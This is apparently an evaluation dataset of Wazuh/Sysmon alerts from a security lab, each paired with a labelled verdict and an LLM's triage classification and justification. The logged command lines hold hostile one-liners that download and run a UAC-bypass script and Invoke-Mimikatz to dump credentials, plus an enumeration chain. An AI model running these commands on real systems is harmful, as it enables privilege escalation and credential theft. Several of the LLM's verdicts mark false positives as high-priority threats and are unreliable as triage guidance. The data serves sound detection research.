{"id": "Thcc15cB1Hp-jZ7fiq3i", "description": "Windows backup and restore tool sdclt.exe launched via C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe with High integrity level", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "Thcc15cB1Hp-jZ7fiq3i", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "sdclt.exe", "image": "C:\\\\Windows\\\\System32\\\\sdclt.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-386c-6868-b602-000000001400}", "description": "Microsoft\u00ae Windows Backup", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "Powershell.exe  \\\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\\\Windows\\\\System32\\\\cmd.exe'\\\"", "processGuid": "{ff3427f9-386d-6868-b702-000000001400}", "logonId": "0xa45f0", "parentProcessId": "8912", "processId": "3360", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:24:13.624", "hashes": "SHA1=8AC6E663FD91342954F67435E25E017726D28B1D,MD5=3813C8CC7C29B96A9B87018DA326D97B,SHA256=1BB9A6F923B3BA8AA26A935A3B92F563CECEA3668C6085768AC33FC703C1F5EB,IMPHASH=43F4450BA53BDDAE70F4D46494FCF21D", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\sdclt.exe\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.3912 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2025-07-04 20:24:13.624\r\nProcessGuid: {ff3427f9-386d-6868-b702-000000001400}\r\nProcessId: 3360\r\nImage: C:\\Windows\\System32\\sdclt.exe\r\nFileVersion: 10.0.26100.3912 (WinBuild.160101.0800)\r\nDescription: Microsoft\u00ae Windows Backup\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: sdclt.exe\r\nCommandLine: \"C:\\WINDOWS\\system32\\sdclt.exe\" \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8AC6E663FD91342954F67435E25E017726D28B1D,MD5=3813C8CC7C29B96A9B87018DA326D97B,SHA256=1BB9A6F923B3BA8AA26A935A3B92F563CECEA3668C6085768AC33FC703C1F5EB,IMPHASH=43F4450BA53BDDAE70F4D46494FCF21D\r\nParentProcessGuid: {ff3427f9-386c-6868-b602-000000001400}\r\nParentProcessId: 8912\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: Powershell.exe  \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:24:13.6412324Z", "eventRecordID": "151087", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Windows backup and restore tool sdclt.exe launched via C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe with High integrity level", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Abuse Elevation Control Mechanism", "Windows Command Shell"], "id": ["T1548", "T1059.003"], "tactic": ["Privilege Escalation", "Defense Evasion", "Execution"]}, "id": "92061"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660655.58310380", "timestamp": "2025-07-04T20:24:15.049+0000"}, "fields": {"timestamp": ["2025-07-04T20:24:15.049Z"]}, "sort": [1751660655049]}, "chatgpt_response": {"alert_id": "Thcc15cB1Hp-jZ7fiq3i", "classification": "TP", "priority": "High", "justification": "This alert was generated by Sysmon for a process creation event (EventID 1) where 'sdclt.exe' (a legitimate Windows backup tool) is being launched with high integrity from PowerShell, which is a known technique for PowerShell abuse (technique T1059.003 and T1548). The command line indicates the download and execution of a known bypass script, indicating potential privilege escalation or defense evasion. The presence of an external script download and immediate execution via PowerShell is highly suspicious and aligns with offensive security techniques. This should be treated as a True Positive with High priority for immediate investigation and response."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "This alert was generated by Sysmon for a process creation event (EventID 1) where 'sdclt.exe' (a legitimate Windows backup tool) is being launched with high integrity from PowerShell, which is a known technique for PowerShell abuse (technique T1059.003 and T1548). The command line indicates the download and execution of a known bypass script, indicating potential privilege escalation or defense evasion. The presence of an external script download and immediate execution via PowerShell is highly suspicious and aligns with offensive security techniques. This should be treated as a True Positive with High priority for immediate investigation and response.", "classification_match": true, "priority_match": false}
{"id": "2kfL1JcBxOat6TbbSJTI", "description": "Logon Failure - Unknown user or bad password", "label": "FP", "rule_level": 5, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "2kfL1JcBxOat6TbbSJTI", "_version": 1, "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.12", "name": "WinSrv2019", "id": "004"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"subjectLogonId": "0x3e7", "subjectDomainName": "SOCLAB", "authenticationPackageName": "Negotiate", "workstationName": "WINSRV2019", "subStatus": "0xc000006a", "logonProcessName": "Advapi", "targetUserName": "vboxuser@soclab.internal", "keyLength": "0", "subjectUserSid": "S-1-5-18", "processId": "0x500", "processName": "C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe", "failureReason": "%%2313", "targetUserSid": "S-1-0-0", "logonType": "8", "subjectUserName": "WINSRV2019$", "status": "0xc000006d"}, "system": {"eventID": "4625", "keywords": "0x8010000000000000", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "level": "0", "channel": "Security", "opcode": "0", "message": "\"An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWINSRV2019$\r\n\tAccount Domain:\t\tSOCLAB\r\n\tLogon ID:\t\t0x3E7\r\n\r\nLogon Type:\t\t\t8\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tvboxuser@soclab.internal\r\n\tAccount Domain:\t\t\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x500\r\n\tCaller Process Name:\tC:\\Windows\\System32\\OpenSSH\\sshd.exe\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWINSRV2019\r\n\tSource Network Address:\t-\r\n\tSource Port:\t\t-\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tAdvapi  \r\n\tAuthentication Package:\tNegotiate\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\t-\r\n\tKey Length:\t\t0\r\n\r\nThis event is generated when a logon request fails. It is generated on the computer where access was attempted.\r\n\r\nThe Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe Process Information fields indicate which account and process on the system requested the logon.\r\n\r\nThe Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\"", "version": "0", "systemTime": "2025-07-04T09:36:18.319485500Z", "eventRecordID": "26458", "threadID": "2336", "computer": "WinSrv2019.soclab.internal", "task": "12544", "processID": "636", "severityValue": "AUDIT_FAILURE", "providerName": "Microsoft-Windows-Security-Auditing"}}}, "rule": {"mail": false, "pci_dss": ["10.2.4", "10.2.5"], "hipaa": ["164.312.b"], "tsc": ["CC6.1", "CC6.8", "CC7.2", "CC7.3"], "description": "Logon Failure - Unknown user or bad password", "groups": ["windows", "windows_security", "authentication_failed"], "nist_800_53": ["AU.14", "AC.7"], "gdpr": ["IV_35.7.d", "IV_32.2"], "firedtimes": 9, "mitre": {"technique": ["Account Access Removal"], "id": ["T1531"], "tactic": ["Impact"]}, "id": "60122", "gpg13": ["7.1"]}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751621778.27518320", "timestamp": "2025-07-04T09:36:18.861+0000"}, "fields": {"timestamp": ["2025-07-04T09:36:18.861Z"]}, "sort": [1751621778861]}, "chatgpt_response": {"alert_id": "2kfL1JcBxOat6TbbSJTI", "classification": "TP", "priority": "High", "justification": "This alert indicates a failed logon attempt due to an unknown username or bad password (status 0xC000006D) for the user 'vboxuser@soclab.internal' on a Windows server (WinSrv2019). The process responsible is sshd.exe, which is unusual for Windows authentication and could indicate lateral movement or attempted brute force via SSH. This is a serious security event that warrants immediate investigation."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "This alert indicates a failed logon attempt due to an unknown username or bad password (status 0xC000006D) for the user 'vboxuser@soclab.internal' on a Windows server (WinSrv2019). The process responsible is sshd.exe, which is unusual for Windows authentication and could indicate lateral movement or attempted brute force via SSH. This is a serious security event that warrants immediate investigation.", "classification_match": false, "priority_match": false}
{"id": "lxca15cB1Hp-jZ7fRKyv", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "lxca15cB1Hp-jZ7fRKyv", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-37d9-6868-a802-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "3676", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:21:45.956", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c powershell.exe \\\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 20:21:45.956\r\nProcessGuid: {ff3427f9-37d9-6868-a802-000000001400}\r\nProcessId: 3676\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:21:45.9668448Z", "eventRecordID": "150745", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660506.57778142", "timestamp": "2025-07-04T20:21:46.870+0000"}, "fields": {"timestamp": ["2025-07-04T20:21:46.870Z"]}, "sort": [1751660506870]}, "chatgpt_response": {"alert_id": "lxca15cB1Hp-jZ7fRKyv", "classification": "TP", "priority": "Critical", "justification": "This alert triggers on the creation of a Windows command prompt (cmd.exe) process spawned by PowerShell, which is a common lateral movement and post-exploitation technique (T1059.003 - Windows Command Shell). The command line shows an attempt to download and execute Invoke-Mimikatz, a well-known credential dumping tool. The presence of Mimikatz in the command line is a strong indicator of credential theft and potential lateral movement. The integrity level is high, the process is running as the user 'snell', and the event is detected by Sysmon (reliable source). This is a critical security event that requires immediate investigation and response."}, "chatgpt_classification": "TP", "chatgpt_priority": "Critical", "chatgpt_justification": "This alert triggers on the creation of a Windows command prompt (cmd.exe) process spawned by PowerShell, which is a common lateral movement and post-exploitation technique (T1059.003 - Windows Command Shell). The command line shows an attempt to download and execute Invoke-Mimikatz, a well-known credential dumping tool. The presence of Mimikatz in the command line is a strong indicator of credential theft and potential lateral movement. The integrity level is high, the process is running as the user 'snell', and the event is detected by Sysmon (reliable source). This is a critical security event that requires immediate investigation and response.", "classification_match": true, "priority_match": false}
{"id": "UBdH15cB1Hp-jZ7fP7C5", "description": "Possible DLL search order hijack by C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\8254f248060006e8b7dcc36da9c8f403\\\\Metadata\\\\fvereseal.dll created in Windows root folder", "label": "FP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "UBdH15cB1Hp-jZ7fP7C5", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "C:\\\\WINDOWS\\\\System32\\\\svchost.exe", "processGuid": "{ff3427f9-1e6a-6868-1400-000000001400}", "processId": "1220", "utcTime": "2025-07-04 21:10:51.161", "targetFilename": "C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\8254f248060006e8b7dcc36da9c8f403\\\\Metadata\\\\fvereseal.dll", "ruleName": "technique_id=T1047,technique_name=File System Permissions Weakness", "creationUtcTime": "2024-09-04 20:13:44.000", "user": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "11", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"File created:\r\nRuleName: technique_id=T1047,technique_name=File System Permissions Weakness\r\nUtcTime: 2025-07-04 21:10:51.161\r\nProcessGuid: {ff3427f9-1e6a-6868-1400-000000001400}\r\nProcessId: 1220\r\nImage: C:\\WINDOWS\\System32\\svchost.exe\r\nTargetFilename: C:\\Windows\\SoftwareDistribution\\Download\\8254f248060006e8b7dcc36da9c8f403\\Metadata\\fvereseal.dll\r\nCreationUtcTime: 2024-09-04 20:13:44.000\r\nUser: NT AUTHORITY\\SYSTEM\"", "version": "2", "systemTime": "2025-07-04T21:10:51.1625112Z", "eventRecordID": "155318", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "11", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 13, "mail": false, "description": "Possible DLL search order hijack by C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\8254f248060006e8b7dcc36da9c8f403\\\\Metadata\\\\fvereseal.dll created in Windows root folder", "groups": ["sysmon", "sysmon_eid11_detections", "windows"], "mitre": {"technique": ["DLL Search Order Hijacking", "DLL Side-Loading"], "id": ["T1574.001", "T1574.002"], "tactic": ["Persistence", "Privilege Escalation", "Defense Evasion"]}, "id": "92219"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751663452.61513865", "timestamp": "2025-07-04T21:10:52.165+0000"}, "fields": {"timestamp": ["2025-07-04T21:10:52.165Z"]}, "sort": [1751663452165]}, "chatgpt_response": {"alert_id": "UBdH15cB1Hp-jZ7fP7C5", "classification": "TP", "priority": "High", "justification": "This alert is triggered by Sysmon event ID 11 (file creation) for a DLL file ('fvereseal.dll') being created in the Windows root folder, matching rules for 'DLL Search Order Hijacking' (T1574.001/002). The process creating the file is svchost.exe under SYSTEM, which is a common vector for persistence and privilege escalation techniques. This is a known attack technique and the alert includes MITRE ATT&CK mapping and multiple detections. This warrants a High priority as it could indicate a compromise or attempt at persistence on the endpoint."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "This alert is triggered by Sysmon event ID 11 (file creation) for a DLL file ('fvereseal.dll') being created in the Windows root folder, matching rules for 'DLL Search Order Hijacking' (T1574.001/002). The process creating the file is svchost.exe under SYSTEM, which is a common vector for persistence and privilege escalation techniques. This is a known attack technique and the alert includes MITRE ATT&CK mapping and multiple detections. This warrants a High priority as it could indicate a compromise or attempt at persistence on the endpoint.", "classification_match": false, "priority_match": false}
{"id": "tRfX1pcB1Hp-jZ7ffqm0", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "tRfX1pcB1Hp-jZ7ffqm0", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-26c5-6868-0c02-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "5676", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 19:08:53.181", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c cmd /r cmd&lt;\\\"C:\\\\AtomicRedTeam\\\\atomics\\\\T1059.003\\\\src\\\\t1059.003_cmd.cmd\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 19:08:53.181\r\nProcessGuid: {ff3427f9-26c5-6868-0c02-000000001400}\r\nProcessId: 5676\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c cmd /r cmd<\"C:\\AtomicRedTeam\\atomics\\T1059.003\\src\\t1059.003_cmd.cmd\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T19:08:53.1831592Z", "eventRecordID": "148840", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 3, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751656134.54882346", "timestamp": "2025-07-04T19:08:54.383+0000"}, "fields": {"timestamp": ["2025-07-04T19:08:54.383Z"]}, "sort": [1751656134383]}, "chatgpt_response": {"alert_id": "tRfX1pcB1Hp-jZ7ffqm0", "classification": "TP", "priority": "High", "justification": "The alert is triggered by Sysmon event ID 1 (Process Creation) for 'cmd.exe' launched via PowerShell, with a specific rule mapping to MITRE ATT&CK T1059.003 (Command-Line Interface). The process chain (PowerShell -> cmd.exe) and command line execution of an external .cmd file are consistent with living-off-the-land techniques commonly used by attackers. The presence of hashes and full process context increases confidence. This is a strong indicator of potentially malicious execution and should be prioritized as High."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "The alert is triggered by Sysmon event ID 1 (Process Creation) for 'cmd.exe' launched via PowerShell, with a specific rule mapping to MITRE ATT&CK T1059.003 (Command-Line Interface). The process chain (PowerShell -> cmd.exe) and command line execution of an external .cmd file are consistent with living-off-the-land techniques commonly used by attackers. The presence of hashes and full process context increases confidence. This is a strong indicator of potentially malicious execution and should be prioritized as High.", "classification_match": true, "priority_match": false}
{"id": "x6mu2pcBGfDWR0X_074N", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "x6mu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-2281-6869-a101-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "3944", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.860", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "C:\\\\WINDOWS\\\\system32\\\\cmd.exe /c qwinsta /server:snell | findstr \\\"Active Disc\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:57.860\r\nProcessGuid: {ff3427f9-2281-6869-a101-000000001500}\r\nProcessId: 3944\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\WINDOWS\\system32\\cmd.exe /c qwinsta /server:snell | findstr \"Active Disc\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: 